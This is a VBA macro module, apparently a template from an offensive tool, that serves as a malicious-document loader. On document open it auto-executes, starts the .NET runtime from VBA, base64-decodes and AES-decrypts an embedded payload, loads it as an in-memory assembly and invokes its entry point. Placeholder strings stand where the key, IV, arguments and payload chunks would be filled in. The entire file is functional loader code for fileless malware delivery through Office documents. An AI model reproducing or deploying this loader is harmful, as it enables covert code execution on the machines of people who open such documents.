Attribute VB_Name = "Loader"
' Entry points for auto-execution
Sub Auto_Open()
    Run
End Sub

Sub AutoOpen()
    Run
End Sub

Private Sub Run()
    On Error GoTo Cleanup

    Dim host As Object
    Set host = CreateObject("mscoree.CorRuntimeHost")
    host.Start

    Dim domain As Object
    host.GetDefaultDomain domain

    Dim xml As Object
    Set xml = CreateObject("MSXML2.DOMDocument.3.0")

    Dim encElem As Object
    Set encElem = xml.createElement("e")
    encElem.dataType = "bin.base64"
    encElem.Text = GetPayload()
    Dim encBytes As Variant
    encBytes = encElem.nodeTypedValue

    Dim keyElem As Object
    Set keyElem = xml.createElement("k")
    keyElem.dataType = "bin.base64"
    keyElem.Text = "YOURKEYHERE"
    Dim keyBytes As Variant
    keyBytes = keyElem.nodeTypedValue

    ' DECRYPT_AES_START
    Dim ivElem As Object
    Set ivElem = xml.createElement("i")
    ivElem.dataType = "bin.base64"
    ivElem.Text = "YOURIVHERE"
    Dim ivBytes As Variant
    ivBytes = ivElem.nodeTypedValue

    Dim oh As Object
    Set oh = domain.CreateInstance("mscorlib", "System.Security.Cryptography.RijndaelManaged")
    Dim aes As Object
    Set aes = oh.Unwrap()
    aes.Mode = 1
    aes.Padding = 2
    aes.Key = keyBytes
    aes.IV = ivBytes

    Dim decryptor As Object
    Set decryptor = aes.CreateDecryptor()
    Dim clearBytes As Variant
    clearBytes = decryptor.TransformFinalBlock(encBytes, CLng(0), CLng(UBound(encBytes) + 1))
    ' DECRYPT_AES_END

    ' DECRYPT_XOR_START
    ' Dim clearBytes() As Byte
    ' ReDim clearBytes(UBound(encBytes))
    ' Dim xi As Long
    ' For xi = 0 To UBound(encBytes)
    '     clearBytes(xi) = encBytes(xi) Xor keyBytes(xi Mod (UBound(keyBytes) + 1))
    ' Next xi
    ' DECRYPT_XOR_END

    Dim asm As Object
    Set asm = domain.Load_3(clearBytes)

    Dim entry As Object
    Set entry = asm.EntryPoint

    If Not entry Is Nothing Then
        Dim prms As Object
        Set prms = entry.GetParameters()
        If prms.Length = 0 Then
            entry.Invoke_2 Nothing, Array()
        Else
            entry.Invoke_2 Nothing, Array(Array(YOURARGS))
        End If
    End If

Cleanup:
    Set entry = Nothing
    Set asm = Nothing
    Set decryptor = Nothing
    Set aes = Nothing
    Set oh = Nothing
    Set xml = Nothing
    Set domain = Nothing
    If Not host Is Nothing Then host.Stop
    Set host = Nothing
End Sub

Private Function GetPayload() As String
    Dim s As String
    s = ""
    ' PAYLOADCHUNKS
    GetPayload = s
End Function
